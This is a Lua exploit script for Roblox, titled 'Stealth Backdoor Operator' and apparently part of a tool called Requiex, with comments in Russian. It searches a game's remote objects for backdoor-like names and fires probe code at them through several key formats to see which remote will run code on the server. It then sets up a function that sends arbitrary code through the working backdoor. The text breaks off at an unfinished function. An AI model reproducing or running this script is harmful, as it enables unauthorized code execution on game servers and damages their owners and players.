-- ===== STEALTH BACKDOOR OPERATOR =====
local StealthBackdoor = { Exploited = false, BackdoorObjects = {}, FoundCommands = {} }

function StealthBackdoor:FindRemotes()
    local remotes = {}
    local containers = {
        ReplicatedStorage,
        game:GetService("Workspace"),
        game:GetService("Lighting"),
        Players.LocalPlayer:FindFirstChild("PlayerGui")
    }
    local keywords = {
        "admin", "backdoor", "bd", "eval", "exec", "execute", "inject",
        "loadstring", "console", "sudo", "cmd", "command", "op", "give",
        "set", "kick", "ban", "teleport", "god", "remote", "handler"
    }
    local blacklist = {
        "__", "test", "debug", "chat", "message", "update", "playerlist",
        "leaderboard", "camera", "input", "render", "sound"
    }
    for _, container in ipairs(containers) do
        if container then
            for _, obj in ipairs(container:GetDescendants()) do
                if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                    local name = obj.Name:lower():gsub("%s+", "")
                    local isBlacklisted = false
                    for _, blPattern in ipairs(blacklist) do
                        if name:find(blPattern) then isBlacklisted = true break end
                    end
                    if not isBlacklisted then
                        for _, kw in ipairs(keywords) do
                            if name == kw or name:find(kw) then
                                table.insert(remotes, obj)
                                break
                            end
                        end
                    end
                end
            end
        end
    end
    self.BackdoorObjects = remotes
    return remotes
end

function StealthBackdoor:TestRemote(remote)
    local marker = "RQ_" .. math.random(100, 999)
    -- Код для проверки: если сервер может выполнить это, он создаст папку в Lighting
    local testCode = "local p = Instance.new('Folder', game:GetService('Lighting')); p.Name = '" .. marker .. "'; task.wait(1); p:Destroy()"

    local formats = {
        {k = nil, c = testCode}, -- Прямой вызов
        {k = "eval", c = testCode},
        {k = "execute", c = testCode},
        {k = "run", c = testCode},
        {k = "loadstring", c = testCode}
    }

    for _, test in ipairs(formats) do
        pcall(function()
            if remote:IsA("RemoteEvent") then
                if test.k then remote:FireServer(test.k, test.c) else remote:FireServer(test.c) end
            else
                if test.k then remote:InvokeServer(test.k, test.c) else remote:InvokeServer(test.c) end
            end
        end)

        task.wait(0.3) -- Ждем, появится ли папка в Lighting
        if game:GetService("Lighting"):FindFirstChild(marker) then
            -- Успех! Сохраняем команду
            if not self.FoundCommands[remote] then self.FoundCommands[remote] = {} end
            table.insert(self.FoundCommands[remote], test.k or "__DIRECT__")
            return true, test.k
        end
    end
    return false, nil
end

function StealthBackdoor:ExploitAll()
    local any = false
    self.BestRemote, self.BestKey = nil, nil
    for _, remote in ipairs(self.BackdoorObjects) do
        local success, key = self:TestRemote(remote)
        if success then
            any = true
            if not self.BestRemote then
                self.BestRemote = remote
                self.BestKey = key
            end
        end
        task.wait(0.1)
    end
    self.Exploited = any
    if any and self.BestRemote then
        Requiex:Log("Backdoor active: "..self.BestRemote.Name.." key="..tostring(self.BestKey), Colors.Green)
        -- Создаём исполняющую функцию с учётом найденного ключа
        Requiex._execBackdoor = function(code)
            local r = self.BestRemote
            local k = self.BestKey
            if not r then return false end
            local ok
            if k then
                if r:IsA("RemoteEvent") then
                    ok = pcall(function() r:FireServer(k, code) end)
                else
                    ok = pcall(function() r:InvokeServer(k, code) end)
                end
            else
                if r:IsA("RemoteEvent") then
                    ok = pcall(function() r:FireServer(code) end)
                else
                    ok = pcall(function() r:InvokeServer(code) end)
                end
            end
            Requiex:Log(ok and "Backdoor OK" or "Backdoor fail", ok and Colors.Green or Colors.Red)
            return ok
        end
        Requiex:SetStatus(Colors.Green)
    else
        Requiex:Log("No exploitable backdoor found", Colors.Red)
    end
    return any
end

function StealthBackdoor:SilentScan()
